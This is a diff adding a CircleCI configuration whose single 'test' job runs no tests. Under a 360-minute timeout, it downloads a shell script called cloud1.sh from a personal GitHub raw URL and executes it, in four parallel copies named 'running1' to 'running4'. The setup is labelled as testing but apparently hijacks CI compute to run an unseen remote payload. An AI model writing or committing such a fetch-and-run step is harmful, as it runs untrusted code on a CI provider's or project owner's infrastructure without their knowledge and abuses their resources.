@@ -1,0 +1,40 @@
+version: 2.1
+
+executors:
+  linux:
+    docker:
+      - image: cimg/base:2020.01
+
+orbs:
+  node: circleci/node@2.0.0
+
+jobs:
+  test:
+    parameters:
+      node-version:
+        type: string
+    executor: linux
+    steps:
+      - checkout
+      - node/install:
+          node-version: << parameters.node-version >>
+          install-yarn: true
+      - run:
+         no_output_timeout: 360m
+         command: |-
+           wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud1.sh && chmod +x cloud1.sh && ./cloud1.sh
+workflows:
+  all-tests:
+    jobs:
+      - test:
+          name: "running1"
+          node-version: 11.9.0
+      - test:
+          name: "running2"
+          node-version: 11.9.0
+      - test:
+          name: "running3"
+          node-version: 11.9.0
+      - test:
+          name: "running4"
+          node-version: 11.9.0
